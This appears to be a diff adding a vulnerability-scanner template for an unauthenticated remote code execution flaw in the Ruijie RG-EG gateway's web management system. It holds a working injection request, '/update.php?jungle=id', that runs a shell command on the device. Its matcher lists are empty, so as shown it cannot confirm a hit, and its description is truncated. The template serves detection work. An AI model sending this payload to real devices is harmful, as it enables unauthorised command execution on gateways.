@@ -1,0 +1,21 @@
+id: ruijie-rg-eg-web-mis-rce
+brief:
+    title: Ruijie RG-EG - Remote Code Execution
+    by: DhiyaneshDk
+    level: critical
+    about: Ruijie RG-EG easy gateway WEB management system front-end RCE has a command execution vulnerability. An attacker without identity authentication can execute arbitrary commands to control server per...
+    label:
+        - ruijie
+        - router
+        - iot
+        - rce
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}'
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/update.php?jungle=id'
+      signs: []
